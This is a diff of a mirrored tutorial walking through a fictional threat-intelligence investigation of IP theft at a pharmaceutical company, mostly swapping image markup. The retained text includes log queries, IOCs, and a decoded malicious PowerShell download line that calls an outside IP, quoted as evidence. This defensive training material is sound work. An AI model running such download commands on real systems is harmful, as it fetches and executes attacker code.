@@ -7,7 +7,7 @@ image: "https://cdn-images-1.medium.com/max/1024/1*l8B3xIJssFbBTn0IvOu6Ng.png"
 # CTI as a Code in Practice: Reactive Investigation — LifeTech Pharma
 
 
-![Cover image](https://cdn-images-1.medium.com/max/1024/1*l8B3xIJssFbBTn0IvOu6Ng.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*l8B3xIJssFbBTn0IvOu6Ng.png" alt="Cover image" width="1024" height="571" loading="eager" fetchpriority="high" decoding="async" />
 
 :::info Article Metadata
 - **Category:** CTI
@@ -23,7 +23,7 @@ This page mirrors the original Medium RSS article into the 1200km.com Docusaurus
 
 ### A complete walkthrough of the methodology applied to a real training scenario: pharmaceutical IP theft, dual entry points, and a DCSync that changes everything.
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*l8B3xIJssFbBTn0IvOu6Ng.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*l8B3xIJssFbBTn0IvOu6Ng.png" alt="Article image" width="1024" height="571" loading="lazy" decoding="async" />
 
 *All organizations, names, and data are fictional. This is training assignment A01 from the CTI as a Code repository.*
 
@@ -122,7 +122,7 @@ tree ~/investigations/lifetech-2024-11/
 
 Expected:
 
-![Article image](https://cdn-images-1.medium.com/max/705/1*DR69iFmEn8s2K0zCrhXk5A.png)
+<img src="https://cdn-images-1.medium.com/max/705/1*DR69iFmEn8s2K0zCrhXk5A.png" alt="Article image" width="705" height="776" loading="lazy" decoding="async" />
 
 ```text
 00-scope/   01-evidence/   02-sources/   03-analysis/
@@ -130,7 +130,7 @@ Expected:
 README.md   intake-form.md   project.yml
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*zQn6v0h7KSMb9nw5gfYp8Q.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*zQn6v0h7KSMb9nw5gfYp8Q.png" alt="Article image" width="1024" height="228" loading="lazy" decoding="async" />
 
 ### 4. Initialize git inside the case folder
 
@@ -204,7 +204,7 @@ notes: "INCD 72h notification clock starts 2024-11-15 18:47 IST. Legal hold on W
 
 **Do not leave any field as****"" or****[] if you know the value.**Unknown fields are fine — write unknown explicitly. A blank field means "forgot to fill in." unknown means "we looked and do not know yet."
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*S90ed0BEsiZXgIu4G3ia5Q.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*S90ed0BEsiZXgIu4G3ia5Q.png" alt="Article image" width="1024" height="980" loading="lazy" decoding="async" />
 
 ### 6. Commit the filled metadata
 
@@ -479,15 +479,15 @@ potentially in scope — US licensing deal ($52M) requires regulatory assessment
 
 **In Scope — fill the asset table:**
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*DCTpI5jIcRRkQ2YqjL8LgQ.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*DCTpI5jIcRRkQ2YqjL8LgQ.png" alt="Article image" width="1024" height="336" loading="lazy" decoding="async" />
 
 **Out of Scope — fill the exclusion table:**
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*X9YT7xlqBXmn_mRAm67QwA.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*X9YT7xlqBXmn_mRAm67QwA.png" alt="Article image" width="1024" height="228" loading="lazy" decoding="async" />
 
 **PIRs — copy from project.yml, add due dates:**
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*Fz8_y2Mq8glncIY5VHdEMA.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*Fz8_y2Mq8glncIY5VHdEMA.png" alt="Article image" width="1024" height="325" loading="lazy" decoding="async" />
 
 **Constraints and Assumptions — fill the four fields:**
 
@@ -630,7 +630,7 @@ For each log source, fill four fields:**Source name**,**System(s) it covers**,**
 
 For LifeTech, the completed source registry drives this inventory:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*Mt6DCDNVu6YThxF6WCowcg.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*Mt6DCDNVu6YThxF6WCowcg.png" alt="Article image" width="1024" height="715" loading="lazy" decoding="async" />
 
 **GAP-001 — WS-IT-LEVI Sysmon: October 22 — November 1, 2024**
 
@@ -698,7 +698,7 @@ VS Code opens with the Explorer panel showing the full evidence tree. Every JSON
 
 **Install four extensions before starting**(Ctrl+Shift+X, search by ID):
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*LyER2G4y2xTAF1kXY4MX6A.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*LyER2G4y2xTAF1kXY4MX6A.png" alt="Article image" width="1024" height="281" loading="lazy" decoding="async" />
 
 Or install all at once from the integrated terminal (Ctrl+`` ):
 
@@ -709,11 +709,11 @@ code --install-extension ms-vscode.hexeditor
 code --install-extension esbenp.prettier-vscode
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/991/1*Pp_6YW13coi4GWZcb2a8Wg.png)
+<img src="https://cdn-images-1.medium.com/max/991/1*Pp_6YW13coi4GWZcb2a8Wg.png" alt="Article image" width="991" height="432" loading="lazy" decoding="async" />
 
 **Key VS Code shortcuts used throughout this step:**
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*2i3dAl46V_xX0cqntP0rCw.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*2i3dAl46V_xX0cqntP0rCw.png" alt="Article image" width="1024" height="449" loading="lazy" decoding="async" />
 
 **Download the training evidence:**
 
@@ -783,11 +783,11 @@ Press Shift+Alt+F to auto-format. The nested structure becomes readable with col
     ▶ prevention_policy
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*EHUHyPz18JBNmPFRWS5VHA.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*EHUHyPz18JBNmPFRWS5VHA.png" alt="Article image" width="1024" height="555" loading="lazy" decoding="async" />
 
 Click any node to jump directly to that section. Click prevention_policy — you see "prevent": false immediately. The CFO's machine is in detect-only mode; the C2 connection is live.**Take the memory dump before anything else.**
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*bsA6unjBprE5asg-jKFbug.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*bsA6unjBprE5asg-jKFbug.png" alt="Article image" width="1024" height="555" loading="lazy" decoding="async" />
 
 **Search**(Ctrl+F): type prevented → jumps to "prevent": false. Type cmdline → jumps to the encoded PowerShell command.
 
@@ -863,7 +863,7 @@ echo "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYg
 
 Output:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*gtvadCAbVwcFaB8UcvEPCQ.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*gtvadCAbVwcFaB8UcvEPCQ.png" alt="Article image" width="1024" height="56" loading="lazy" decoding="async" />
 
 ```text
 $c=New-Object System.Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');$d=$c.DownloadString('https://203.0.113.87/update')
@@ -880,9 +880,9 @@ jq 'select(.EventID == 11) | {
 
 **Or use Base64 extention:**
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*NX8NZYV10DhI03Lgy9E07A.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*NX8NZYV10DhI03Lgy9E07A.png" alt="Article image" width="1024" height="761" loading="lazy" decoding="async" />
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*hRToibL_ojf36voYhSco2A.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*hRToibL_ojf36voYhSco2A.png" alt="Article image" width="1024" height="761" loading="lazy" decoding="async" />
 
 **Found IOCs**
 
@@ -905,7 +905,7 @@ Press F5 (or click RBQL in the status bar) to open the query console:
 SELECT a.* WHERE a16 == "fail" ORDER By a1
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*IF23O_x92zR5XPNGe7gP2A.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*IF23O_x92zR5XPNGe7gP2A.png" alt="Article image" width="1024" height="138" loading="lazy" decoding="async" />
 
 Result pane (right side):
 
@@ -941,7 +941,7 @@ Key finding — CFO phishing email:
   | SCL=4 | DMARC=fail | has_attachment=1
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*p6mJFnpdRJE2EvoF-IxUFw.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*p6mJFnpdRJE2EvoF-IxUFw.png" alt="Article image" width="1024" height="138" loading="lazy" decoding="async" />
 
 The .xlsm attachment was not sandboxed — ATP policy gap (INT-007). Add globalcontracts-secure.net to IOC list.
 
@@ -984,11 +984,11 @@ jq '.[] | {
 }' azure-ad/signin-p.levi.json
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*XkLVEejy4bkZ71px3sihoQ.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*XkLVEejy4bkZ71px3sihoQ.png" alt="Article image" width="1024" height="363" loading="lazy" decoding="async" />
 
 **Red flags on****aad-signin-002:**
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*Isdphk9PrvplMM2sWbc8Vg.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*Isdphk9PrvplMM2sWbc8Vg.png" alt="Article image" width="1024" height="563" loading="lazy" decoding="async" />
 
 **Found IOCs**
 
@@ -1015,7 +1015,7 @@ grep "p.levi" vpn/anyconnect-2024-10-24.log \
 
 Output:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*BsNecLZvZT8bDwFYWsb-nQ.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*BsNecLZvZT8bDwFYWsb-nQ.png" alt="Article image" width="1024" height="112" loading="lazy" decoding="async" />
 
 ```text
 Oct 24 00:17:14 ... User &lt;p.levi&gt; IP &lt;185.220.101.47&gt; Authentication: successful
@@ -1045,7 +1045,7 @@ grep "203.0.113.87" vpn/anyconnect-2024-10-24.log | awk '{print $1,$2,$3}' | hea
 
 Rainbow CSV colorizes columns. The status bar shows column names as you move the cursor.
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*Yz7EggRReYdjyRyz79n79A.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*Yz7EggRReYdjyRyz79n79A.png" alt="Article image" width="1024" height="452" loading="lazy" decoding="async" />
 
 RBQLHeader
 a1receive_time
@@ -1079,7 +1079,7 @@ ORDER BY parseInt(a29) DESC
 
 Result:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*pszv_-CeRnD-lNlUmL8VBQ.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*pszv_-CeRnD-lNlUmL8VBQ.png" alt="Article image" width="1024" height="452" loading="lazy" decoding="async" />
 
 ```text
 2024-11-06T00:14:14Z | 10.10.2.15 | 198.51.100.44 | 443 | 381 MB | 409 KB | 312s |
@@ -1105,7 +1105,7 @@ WHERE parseInt(a28) &gt; 100000
 ORDER BY parseInt(a29) DESC
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*UkpGfIAnhSx0k-VE5CATzg.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*UkpGfIAnhSx0k-VE5CATzg.png" alt="Article image" width="1024" height="116" loading="lazy" decoding="async" />
 
 Result: only one row — 10.10.2.15 → 198.51.100.44, 99% upload, 381 MB. Every other flow is bidirectional C2 (55–65% upload) which is beacon traffic, not exfil.
 
@@ -1125,7 +1125,7 @@ GROUP BY a6Result:
 198.51.100.44  | 1 session  | 399 MB avg | 312s avg
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*264pKTvyyeuGVoAIwQVvSw.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*264pKTvyyeuGVoAIwQVvSw.png" alt="Article image" width="1024" height="116" loading="lazy" decoding="async" />
 
 203.0.113.87 has 9 short uniform sessions — beacon. 198.51.100.44 has one giant session — exfil.
 
@@ -1141,7 +1141,7 @@ ORDER BY a1
 
 Result:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*epr64_sA5gqNzWxgEi-LpQ.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*epr64_sA5gqNzWxgEi-LpQ.png" alt="Article image" width="1024" height="116" loading="lazy" decoding="async" />
 
 ```text
 2024-11-15T19:14:08Z | 10.10.1.45 | 10.10.2.20 | 135   | 8441  | InternalAccess-Allow
@@ -1160,7 +1160,7 @@ ORDER BY a1
 
 Result:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*f8M-EcFKrYAOXIzIOfoNlw.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*f8M-EcFKrYAOXIzIOfoNlw.png" alt="Article image" width="1024" height="208" loading="lazy" decoding="async" />
 
 ```text
 2024-11-01T07:14:02Z | 10.10.3.22 | 8441 bytes | 47s   ← WS-IT-LEVI session 1
@@ -1200,7 +1200,7 @@ ORDER BY a1
 
 Result — full malware DNS timeline:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*RErM3MswME78yNNi0pB92A.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*RErM3MswME78yNNi0pB92A.png" alt="Article image" width="1024" height="256" loading="lazy" decoding="async" />
 
 ```text
 2024-10-22T09:28:41Z | 10.10.3.22 | mfa-lifetechpharma.com       | 185.220.101.47  | malware ← AiTM phishing page loaded
@@ -1228,7 +1228,7 @@ GROUP BY a2
 
 Result:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*v94DK5JOd0MBwJUOjqBpAg.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*v94DK5JOd0MBwJUOjqBpAg.png" alt="Article image" width="1024" height="135" loading="lazy" decoding="async" />
 
 ```text
 10.10.3.22 | 6   ← WS-IT-LEVI (IT admin) — infected Nov 1
@@ -1247,7 +1247,7 @@ ORDER BY a1
 
 Result:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*lj9D7dZos_et_O16rjcfOg.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*lj9D7dZos_et_O16rjcfOg.png" alt="Article image" width="1024" height="135" loading="lazy" decoding="async" />
 
 ```text
 2024-10-24T00:16:44Z | 185.220.101.47 | vpn.lifetechpharma.com | 10.10.8.1 | business-and-economy
@@ -1328,7 +1328,7 @@ jq 'select(.EventID == 4662) | {
 
 Output:
 
-![Article image](https://cdn-images-1.medium.com/max/881/1*xlE6AoS-kD4FYW5DmwGVxw.png)
+<img src="https://cdn-images-1.medium.com/max/881/1*xlE6AoS-kD4FYW5DmwGVxw.png" alt="Article image" width="881" height="392" loading="lazy" decoding="async" />
 
 ```text
 {"time": "2024-11-06T00:48:33Z", "subject": "svc_backup", "object": "DC=lifetechpharma,DC=local"}
@@ -1340,7 +1340,7 @@ krbtgt and Administrator DCSync'd — golden ticket capability obtained. Full do
 
 **Click****windows-security/SERVER-RD-02-security.jsonl:**
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*r5ZHpES2uPK3SDDVU4yoMg.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*r5ZHpES2uPK3SDDVU4yoMg.png" alt="Article image" width="1024" height="307" loading="lazy" decoding="async" />
 
 Ctrl+F → 4663 — file access events. Ctrl+F → 5156 — network connection event.
 
@@ -1374,7 +1374,7 @@ VS Code’s Ctrl+Shift+F searches across every open file simultaneously. Use it 
 
 Ctrl+Shift+F → 198.51.100.44:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*qD5I2ewZTvBRksb7P9Zt5A.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*qD5I2ewZTvBRksb7P9Zt5A.png" alt="Article image" width="1024" height="512" loading="lazy" decoding="async" />
 
 ```text
 ngfw-flows.csv           line 12: ...10.10.2.15,198.51.100.44,443,...399481224...
@@ -1389,7 +1389,7 @@ Four files, four hits, one IP. The full exfiltration chain is visible in one sea
 
 Ctrl+Shift+F → svc_backup:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*E8CUk7R4lSjYg01UIH0chg.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*E8CUk7R4lSjYg01UIH0chg.png" alt="Article image" width="1024" height="904" loading="lazy" decoding="async" />
 
 ```text
 DC01-security.jsonl       lines 7-9:   DCSync events
@@ -1401,7 +1401,7 @@ sql-audit.jsonl           all 6 lines: full xp_cmdshell chain
 
 Ctrl+Shift+F → telemetry-cdn-services.biz:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*WeNgTuMzhjm9Pl_lXXGmvQ.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*WeNgTuMzhjm9Pl_lXXGmvQ.png" alt="Article image" width="1024" height="365" loading="lazy" decoding="async" />
 
 ```text
 dns-queries.csv           lines 12-23: 11 beacon queries (6 from WS-IT-LEVI, 4 from WS-CFO-01, 1 missing)
@@ -1411,7 +1411,7 @@ dns-queries.csv           lines 12-23: 11 beacon queries (6 from WS-IT-LEVI, 4 f
 
 Ctrl+Shift+F → 185.220.101.47:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*MHyXMsFanJsG_dvdWSnKqw.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*MHyXMsFanJsG_dvdWSnKqw.png" alt="Article image" width="1024" height="602" loading="lazy" decoding="async" />
 
 ```text
 azure-ad/signin-p.levi.json          line 18: suspicious sign-in from Istanbul — token replay, no MFA
@@ -1423,7 +1423,7 @@ One IP ties together AiTM credential theft, VPN infiltration, and the recon that
 
 The full attack chain — AiTM phishing → VPN access → formula exfiltration → DCSync → CFO infection — is navigable via these four global searches without opening a SIEM:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*n_vokO1vkbqN5O709MFF-w.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*n_vokO1vkbqN5O709MFF-w.png" alt="Article image" width="1024" height="683" loading="lazy" decoding="async" />
 
 Search termAttack phase covered185.220.101.47Initial access: AiTM phishing, VPN infiltration, attacker recontelemetry-cdn-services.bizPersistence: C2 beaconing from both infected hostssvc_backupLateral movement: SMB, xp_cmdshell chain, DCSync198.51.100.44Exfiltration: NGFW flow, DNS lookup, SQL upload command, EID 5156
 
@@ -1580,7 +1580,7 @@ Submit svchost32.exe (recovered via CrowdStrike RTR) to a sandbox. ANY.RUN is th
 5. Timeout:**120 seconds**— beacon contacts C2 within the first minute
 6. Click**Run**
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*WYRLofzCq0I_GY_w7ozZzw.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*WYRLofzCq0I_GY_w7ozZzw.png" alt="Article image" width="1024" height="552" loading="lazy" decoding="async" />
 
 **Download the report to VS Code:**
 
@@ -1833,7 +1833,7 @@ Then add one row per event. Every row needs: timestamp (UTC), host, what happene
 
 The timeline reveals what the CFO alert obscured: the breach started 24 days earlier through a completely different person.
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*121cvZ2ZIHZLNAmQA78l9Q.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*121cvZ2ZIHZLNAmQA78l9Q.png" alt="Article image" width="1024" height="683" loading="lazy" decoding="async" />
 
 1. **2024–10–18 — External
 **lifetechpharma-corp[.]eu registered as a typosquat domain.
@@ -1976,7 +1976,7 @@ If you cannot answer question 4, the claim is not ready to write. Think first.
 
 The claims ledger converts the timeline into auditable, falsifiable assertions. Each claim answers five questions: what, evidence, confidence, competing hypotheses, which PIR.
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*hBZhaHELHNyuzUeTbMbGvw.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*hBZhaHELHNyuzUeTbMbGvw.png" alt="Article image" width="1024" height="659" loading="lazy" decoding="async" />
 
 **CL-001 — Initial access via AiTM phishing against IT admin****p.levi**
 
@@ -2094,7 +2094,7 @@ scope:
 
 ### 2. Fill one row per technique
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*k61svPS7k5oRag9OCWIk4w.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*k61svPS7k5oRag9OCWIk4w.png" alt="Article image" width="1024" height="594" loading="lazy" decoding="async" />
 
 **T1566.001 — Phishing attachment, CFO****.xlsm**
 
@@ -2223,7 +2223,7 @@ The actor compromised the IT admin first (October 22), used that access for data
 
 **Attribution confidence: Medium-High.**Apply the confidence ladder from Step R5 of the methodology to score this case:
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*rrKN1yNFJL_eINzt_iec9A.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*rrKN1yNFJL_eINzt_iec9A.png" alt="Article image" width="1024" height="576" loading="lazy" decoding="async" />
 
 **Ladder tier: Medium-High**— TTP overlap + infrastructure match present; independent confirmation absent. The toolset has not been definitively matched to a named cluster, which prevents elevation to High.
 
@@ -2486,7 +2486,7 @@ git commit -m "PROJ-2024-001: deliverables — executive brief, SOC handoff, INC
 
 ## The Git History: What a Completed Investigation Looks Like
 
-![Article image](https://cdn-images-1.medium.com/max/1024/1*9m5xzm1v4yUoNN47GznubQ.png)
+<img src="https://cdn-images-1.medium.com/max/1024/1*9m5xzm1v4yUoNN47GznubQ.png" alt="Article image" width="1024" height="265" loading="lazy" decoding="async" />
 
 ```text
 b9a2f1c  PROJ-001: deliverables — executive brief, SOC handoff, INCD notification ready
